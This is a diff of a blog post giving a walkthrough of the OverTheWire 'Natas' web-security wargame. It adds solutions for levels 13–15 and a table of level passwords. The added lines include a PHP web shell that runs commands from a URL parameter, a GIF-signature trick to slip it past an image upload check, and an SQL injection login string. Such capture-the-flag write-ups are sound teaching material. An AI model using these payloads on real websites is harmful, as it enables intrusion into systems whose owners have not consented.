@@ -1,7 +1,7 @@
 ---
 layout: post
 title: 'OverTheWire "Natas" writeup'
-date: 2021-10-08 00:00:00 +0200
+date: 2021-10-09 00:00:00 +0200
 categories: over-the-wire
 ---
 
@@ -9,14 +9,16 @@ categories: over-the-wire
 
 _Because it's not a real writeup if it doesn't start with a disclaimer._\
 \
-This writeup is not intended to ruin the game to anyone. Passwords are omitted in the whole document, and published in a table you can find at the and of the page.\
+This writeup is not intended to ruin the game to anyone. Passwords are omitted in the whole document, and published in a table you can find at the end of the page.\
 If you haven't tried to solve the game on your own, try to follow the hints in the next paragraphs before following the easy route.\
 \
 _Link to the [game](https://overthewire.org/wargames/natas/)._
 
 ## THE RED THREAD
 
-Using the console is always the first thing you should do. It gives hints, info and sometimes the password itself! When exploring a website, to access files, folders and whatsoever, you can simply append the path to the URL. This is really important to beat the game!
+Using the console is always the first thing you should do. It gives hints, info and sometimes the password itself! \
+When exploring a website, to access files, folders and whatsoever, you can simply append the path to the URL. This is really important to beat the game! \
+To intercept requests and modify them, I use `burpsuite` (free edition is more than enough), but even the one offered by the Browser might suffice.
 
 ## SPOILER-FREE SOLUTIONS
 
@@ -34,7 +36,7 @@ Same as above. Just find another way to open the developer tools.
 
 # Natas 2 -> Natas 3:
 
-There really is nothing on the main page. Only an hint: a files/pixel.png. Guess what: it's a pixel. Peculiar the fact that the image is in a folder called "files". I wonder what's in the same directory...
+There really is nothing on the main page. Only an hint: a files/pixel.png. Guess what: it's a pixel. How interesting. What's peculiar is the fact that the image is in a folder called "files". I wonder what's in the same directory...
 
 # Natas 3 -> Natas 4:
 
@@ -120,7 +122,7 @@ If we intercept the request, in the header, we can find the encrypted data:
 ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
 ```
 
-If we apply the algorithm using the array encoded with json*encode (\_little of trial and error here, but my bad. It's a request, it must be a json!*) and our encrypted data decoded from base64 (_if you find an `=` character at the end of a string, you can be sure it is encoded in base64_), we can easily fetch the key:
+If we apply the algorithm using the array encoded with json*encode (\_little of trial and error here, but my bad. It's a request, it must be a json!*) and our encrypted data decoded from base64 (_if you find an `=` character at the end of a string, you can almost always be sure it is encoded in base64_), we can easily fetch the key:
 
 ```php
 <?
@@ -177,7 +179,33 @@ This challenge teaches us that it is wrong to let upload files without the right
 passthru("cat /etc/natas_webpass/natas13");
 ?>
 ```
-I called it "test.php". Once you did it, upload the file on the website, and intercept the request, changing the file extension randomly generated to PHP. 
+I called it "test.php". Once you did it, upload the file on the website, and intercept the request, changing the file extension randomly generated to PHP. \
+\
+_FYI if we want to be extremly flexible and spawn an actual shell, we could've ```<?passthru($_GET["cmd"]);?>``` instead, and pass commands as parameters._
+
+# Natas 13 -> Natas 14:
+
+We need to trick the php script into thinking the code we are submitting is, indeed, an image. Researching about how does the `exif_imagetype()` function works, shows something peculiar. From the [official documentation](https://www.php.net/manual/en/function.exif-imagetype.php):
+```
+exif_imagetype() reads the first bytes of an image and checks its signature.
+
+exif_imagetype() can be used to avoid calls to other exif functions with unsupported file types or in conjunction with $_SERVER['HTTP_ACCEPT'] to check whether or not the viewer is able to see a specific image in the browser. 
+```
+
+So, it only checks the first bytes of an image and check its signature. Ain't that smart? \
+Let's look for some [valid signatures](https://www.garykessler.net/library/file_sigs.html) online for image files. The easiest ones to put in code are GIFs. \
+Let's make a new `test.php`, but this time let's actually change the first bytes of the file with the one of a valid signature:
+```php
+GIF87a
+<?
+passthru($_GET["cmd"]);
+?>
+```
+Then let's do what we did until now...
+
+# Natas 14 -> Natas 15:
+
+SQL Injection? SQL Injection. Your username should be `a" OR 1=1 #`. Input sanification is **REALLY** important!
 
 ## PASSWORDS (SPOILERS)
 
@@ -203,3 +231,6 @@ _As you wish._
 | Lev 10 -> Lev 11 | U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK |
 | Lev 11 -> Lev 12 | EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 |
 | Lev 12 -> Lev 13 | jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY |
+| Lev 13 -> Lev 14 | Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 |
+| Lev 14 -> Lev 15 | AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J |
+
